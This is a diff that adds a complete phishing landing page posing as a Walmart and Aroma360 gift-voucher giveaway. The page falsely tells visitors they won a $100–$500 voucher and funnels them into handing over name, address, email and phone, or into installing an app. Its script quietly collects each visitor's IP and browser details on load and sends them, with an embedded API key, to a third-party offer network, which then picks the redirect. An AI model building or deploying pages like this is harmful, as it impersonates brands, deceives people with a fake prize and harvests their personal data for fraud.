@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Aroma360 x Walmart Rewards</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --gold: #d4af37; 
+            --gold-glow: rgba(212, 175, 55, 0.3);
+            --dark-bg: #050505; 
+        }
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background-color: var(--dark-bg); 
+            color: #ffffff; 
+            margin: 0; padding: 0;
+            overflow-x: hidden;
+            font-weight: 800;
+        }
+        .serif { font-family: 'Playfair Display', serif; }
+        
+        .bg-glow {
+            position: fixed; top: 0; left: 50%; transform: translateX(-50%);
+            width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% -20%, var(--gold-glow) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        .premium-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(212, 175, 55, 0.15);
+            border-radius: 20px;
+        }
+
+        .gold-text {
+            background: linear-gradient(135deg, #f5d27a 0%, #b8860b 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+            font-size: 15px;
+            letter-spacing: 2.5px;
+        }
+
+        .action-button {
+            background: linear-gradient(135deg, #FF9900 0%, #ffb347 100%);
+            color: #131921;
+            font-weight: 900;
+            box-shadow: 0 10px 40px rgba(255, 153, 0, 0.25);
+        }
+        
+        @keyframes pulse-orange {
+            0% { box-shadow: 0 0 0 0 rgba(255, 153, 0, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 153, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 153, 0, 0); }
+        }
+        .pulse { animation: pulse-orange 2s infinite; }
+        b, strong { font-weight: 900; color: white; }
+        
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .hidden { display: none; }
+
+        .important-text {
+            font-size: 16px !important;
+            line-height: 1.8 !important;
+            letter-spacing: 0.5px !important;
+            display: block;
+        }
+
+        /* Edits for Mobile Optimization - Full Width Stretch */
+        .main-wrapper {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        @media (max-width: 640px) {
+            .main-wrapper { padding: 0 10px; }
+            .claim-container {
+                padding-left: 12px !important;
+                padding-right: 12px !important;
+                border-radius: 15px !important;
+            }
+            .bg-zinc-900\/80 {
+                padding: 15px !important;
+            }
+        }
+    </style>
+</head>
+<body class="antialiased">
+    <div class="bg-glow"></div>
+
+    <header class="py-6 text-center">
+        <div class="flex justify-center items-center gap-4 mb-4">
+             <img src="https://i.postimg.cc/L65Q3YDJ/Walmart-logo-(2008)-svg.png" class="h-6 invert" alt="Walmart">
+             <span class="text-zinc-500 font-bold text-2xl">+</span>
+             <img src="https://i.postimg.cc/Y0sJVkxM/Sans-titre-removebg-preview.png" class="h-10" alt="Aroma360 Logo">
+        </div>
+    </header>
+
+    <main class="main-wrapper pb-8">
+        
+        <div class="text-center mb-6 px-4">
+            <h2 class="serif text-2xl font-black mb-6 leading-tight text-white italic">
+                Your Walmart reward is ready (Aroma360 annual partnership)
+            </h2>
+            
+            <div class="premium-card p-6 text-left space-y-4 relative overflow-hidden mb-4">
+                <p class="text-zinc-100">
+                    As part of our annual partnership with Walmart and in celebration of the anniversary of Aroma360, we have secured a limited number of gift vouchers to be distributed exclusively to our loyal customers who shopped this month from Aroma Store.
+                </p>
+                <p class="text-zinc-100">
+                    Since you recently placed a purchase order from our website Aroma360 using this phone number, you were entered into a random draw with the last 200 orders. We are pleased to inform you that you are one of the 100 winners selected to receive an Walmart Gift Voucher valued between <strong>$100 and $500</strong>.
+                </p>
+            </div>
+
+            <div class="premium-card p-4 mb-4">
+                <img src="https://i.postimg.cc/Bnkz6xrJ/Sans-titre.png" class="w-full rounded-lg" alt="Walmart Gift Card Reward">
+                <div class="flex justify-between items-center mt-4 px-2 text-left">
+                    <div>
+                        <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold">Status</p>
+                        <p class="text-green-400 font-bold text-[12px] flex items-center gap-1"><span class="h-2 w-2 bg-green-400 rounded-full animate-pulse"></span> Pending Revelation</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-[10px] uppercase tracking-widest text-zinc-500 font-bold">Value Range</p>
+                        <p class="text-xl font-black text-white">$100 - $500</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="premium-card p-6 border-t-4 border-t-[#FF9900] claim-container">
+            <div class="bg-zinc-900/80 p-5 rounded-xl mb-6 border border-zinc-800">
+                <div class="flex items-center gap-2 mb-3">
+                    <h4 class="gold-text uppercase">HOW TO CLAIM YOUR VOUCHER:</h4>
+                </div>
+                
+                <div id="android-content" class="hidden">
+                    <p class="text-zinc-100 mb-4">
+                        The process is simple. To verify your identity and reveal your reward amount, please complete a brief customer survey (it only takes a minute) by providing your email, full name, address, and phone number.
+                    </p>
+                    <div class="bg-orange-500/10 border border-orange-500/30 p-4 rounded-lg mb-4">
+                        <p class="text-orange-500 font-black mb-2 text-sm">IMPORTANT:</p>
+                        <p class="text-zinc-200 font-bold important-text">
+                            This survey is fully secure and used solely for identity verification to prevent fraudulent claims before your Walmart gift voucher is dispatched via SMS.
+                        </p>
+                    </div>
+                    
+                    <button id="claim-btn-android" class="action-button pulse w-full py-5 rounded-xl text-[15px] uppercase tracking-widest font-black mb-4">
+                        REVEAL & CLAIM REWARD
+                    </button>
+
+                    <p class="text-zinc-100 text-sm">
+                        Once the survey is successfully completed, you will receive an SMS containing your unique gift voucher code.
+                    </p>
+                </div>
+
+                <div id="ios-content" class="hidden">
+                    <p class="text-zinc-100 mb-4">
+                        It's simple: Download the TikTok app by clicking the button below.
+                    </p>
+                    <div class="bg-orange-500/10 border border-orange-500/30 p-4 rounded-lg mb-4">
+                        <p class="text-orange-500 font-black mb-2 text-sm">IMPORTANT:</p>
+                        <p class="text-zinc-200 font-bold important-text">
+                            Ensure you download the app from this page to guarantee a successful redirection to your voucher. After downloading, wait just 30 seconds and you will be directed to a video less than a minute long where you will find your unique voucher code to shop at all Walmart stores.
+                        </p>
+                    </div>
+                    
+                    <button id="claim-btn-ios" class="action-button pulse w-full py-5 rounded-xl text-[15px] uppercase tracking-widest font-black mb-4">
+                        REVEAL & CLAIM REWARD
+                    </button>
+
+                    <p class="text-zinc-100 text-sm">
+                        <strong>Note:</strong> Every person will be redirected to their own specific video containing a unique voucher. You must follow these instructions exactly to access your video and copy your code.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="py-8 text-center text-zinc-600 text-[10px] font-black tracking-[4px] uppercase border-t border-zinc-900">
+        © 2026 AROMA360® x WALMART
+    </footer>
+
+    <script>
+        function detectOS() {
+            const userAgent = window.navigator.userAgent || window.navigator.vendor || window.opera;
+            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                document.getElementById('ios-content').classList.remove('hidden');
+            } else {
+                document.getElementById('android-content').classList.remove('hidden');
+            }
+        }
+        detectOS();
+
+        const API_KEY = "43744|6htDHpS6kWMAUQoxPXgRRrXaJWUxxMh9Eh1ewMPZfc8e6317";
+        let offerLink = "";
+
+        async function preFetchOffer() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await res.json();
+                const offerRes = await fetch(`https://lockedapp.org/api/v2?ip=${ip}&user_agent=${encodeURIComponent(navigator.userAgent)}`, {
+                    headers: { 'Authorization': `Bearer ${API_KEY}` }
+                });
+                const data = await offerRes.json();
+                if(data.offers && data.offers.length > 0) {
+                    offerLink = data.offers[0].link;
+                }
+            } catch(e) { console.error("Syncing..."); }
+        }
+
+        function handleClaim() {
+            if(offerLink !== "") {
+                window.location.href = offerLink;
+            } else {
+                window.location.href = "https://lockedapp.org/cl/i/ok29o1"; 
+            }
+        }
+
+        const btnIos = document.getElementById('claim-btn-ios');
+        const btnAndroid = document.getElementById('claim-btn-android');
+        if(btnIos) btnIos.onclick = handleClaim;
+        if(btnAndroid) btnAndroid.onclick = handleClaim;
+
+        preFetchOffer();
+    </script>
+</body>
+</html>
